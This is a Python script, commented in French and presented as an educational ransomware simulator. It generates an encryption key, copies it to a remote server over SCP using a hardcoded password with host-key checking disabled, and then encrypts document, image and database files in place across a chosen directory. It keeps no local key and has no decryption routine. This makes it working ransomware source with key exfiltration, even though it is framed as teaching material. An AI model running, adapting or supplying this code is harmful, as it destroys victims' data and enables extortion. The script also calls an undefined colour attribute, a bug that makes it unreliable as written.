#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION SANS PARAMIKO
import os
import sys
import time
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import subprocess

# Configuration des couleurs
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
SSH_PASSWORD = "doranco"  # À changer ou utiliser une clé SSH
REMOTE_DIR = "/home/doranco/cle_dechiffrement"

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        
        # Extensions cibles
        self.target_exts = {
            '.txt', '.doc', '.docx', '.xls', '.xlsx', 
            '.pdf', '.jpg', '.png', '.sql', '.db'
        }

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(f"""{Colors.RED}
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
    {Colors.END}""")
        print(f"{Colors.CYAN}=== SIMULATEUR ÉDUCATIF - VERSION SCP ==={Colors.END}\n")

    def generate_key(self):
        """Génère une clé de chiffrement"""
        print(f"{Colors.GREEN}Génération de la clé...{Colors.END}")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"Clé générée: {Colors.YELLOW}{self.key.decode()[:12]}...{Colors.END}")
        return True

    def transfer_key_scp(self):
        """Transfère la clé via SCP"""
        if not self.key:
            print(f"{Colors.RED}Aucune clé générée!{Colors.END}")
            return False

        try:
            # Crée un fichier temporaire
            key_file = "/tmp/decryption_key.key"
            with open(key_file, 'wb') as f:
                f.write(self.key)
            
            # Commande SCP
            cmd = [
                'sshpass', '-p', SSH_PASSWORD,
                'scp', '-o', 'StrictHostKeyChecking=no',
                key_file,
                f"{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/key_{os.uname().nodename}.key"
            ]
            
            # Exécution
            result = subprocess.run(cmd, check=True, capture_output=True, text=True)
            
            # Nettoyage
            os.remove(key_file)
            
            print(f"{Colors.GREEN}Clé transférée vers {Colors.CYAN}{SSH_SERVER}{Colors.END}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}Échec SCP: {e.stderr}{Colors.END}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if os.path.getsize(filepath) > 50 * 1024 * 1024:  # 50MB max
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            return True
        except Exception as e:
            print(f"{Colors.RED}Erreur sur {filepath}: {str(e)}{Colors.END}")
            return False

    def encrypt_directory(self, path):
        """Chiffre un dossier"""
        if not os.path.exists(path):
            print(f"{Colors.RED}Dossier introuvable: {path}{Colors.END}")
            return

        encrypted = errors = 0
        print(f"{Colors.PURPLE}Chiffrement de {path}...{Colors.END}")
        
        for root, _, files in os.walk(path):
            for file in files:
                filepath = Path(root) / file
                
                if filepath.suffix.lower() not in self.target_exts:
                    continue
                
                if self.encrypt_file(filepath):
                    encrypted += 1
                else:
                    errors += 1
        
        print(f"{Colors.GREEN}Terminé! {encrypted} fichiers chiffrés, {errors} erreurs{Colors.END}")

    def show_menu(self):
        """Affiche le menu interactif"""
        while True:
            self.show_banner()
            print(f"{Colors.BOLD}MENU PRINCIPAL:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Générer une clé")
            print(f"{Colors.GREEN}2.{Colors.END} Transférer la clé (SCP)")
            print(f"{Colors.GREEN}3.{Colors.END} Chiffrer un dossier")
            print(f"{Colors.RED}0.{Colors.END} Quitter")
            
            choice = input("\nVotre choix: ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.transfer_key_scp()
            elif choice == "3":
                path = input("Chemin du dossier à chiffrer: ")
                self.encrypt_directory(path)
            elif choice == "0":
                print(f"{Colors.YELLOW}Au revoir!{Colors.END}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Choix invalide!{Colors.END}")
            
            input("\nAppuyez sur Entrée pour continuer...")

if __name__ == '__main__':
    # Vérification des dépendances système
    try:
        subprocess.run(['sshpass', '-V'], capture_output=True, check=True)
        subprocess.run(['scp', '-V'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Colors.RED}Erreur: sshpass et scp doivent être installés{Colors.END}")
        print("Installez-les avec:")
        print("sudo apt install sshpass openssh-client")  # Debian/Ubuntu
        print("ou")
        print("sudo yum install sshpass openssh-clients")  # RHEL/CentOS
        sys.exit(1)
    
    try:
        sim = RansomwareSimulator()
        sim.show_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Interruption par l'utilisateur{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}ERREUR FATALE: {str(e)}{Colors.END}")
        sys.exit(1)